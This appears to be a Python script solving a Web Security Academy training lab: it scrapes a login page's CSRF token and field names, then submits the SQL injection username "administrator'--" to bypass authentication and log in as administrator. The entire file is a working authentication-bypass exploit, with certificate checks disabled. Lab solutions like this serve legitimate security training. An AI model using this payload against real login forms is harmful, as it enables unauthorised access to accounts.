import requests
import bs4

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_field_names(text):
    soup=bs4.BeautifulSoup(text,'html.parser')
    csrf_value=soup.find('input', attrs={'name': 'csrf'})['value']
    username_field = soup.find('input',attrs={'type':'username'})['name']
    password_field = soup.find('input',attrs={'type':'password'})['name']
    return csrf_value,username_field,password_field
    


def main():
    host="https://0a7d00cd0332d5b280a75882008b005f.web-security-academy.net"
    login_url=f'{host}/login'
    client=requests.Session()
    client.verify=False
    csrf_value,username_field,password_field=get_field_names(client.get(login_url).text)
    malicious_username="administrator'--"
    password='blablabla'
    payload={
        'csrf':csrf_value,
        f'{username_field}':malicious_username,
        f'{password_field}':password
    }
    r=client.post(login_url,data=payload,allow_redirects=True)
    if 'Your username is: administrator' in r.text:
        print(f'[+] Lab Solved LESSGOOOOO')
    else:
        print(f'Try harder noob!')



if __name__=="__main__":
    main()

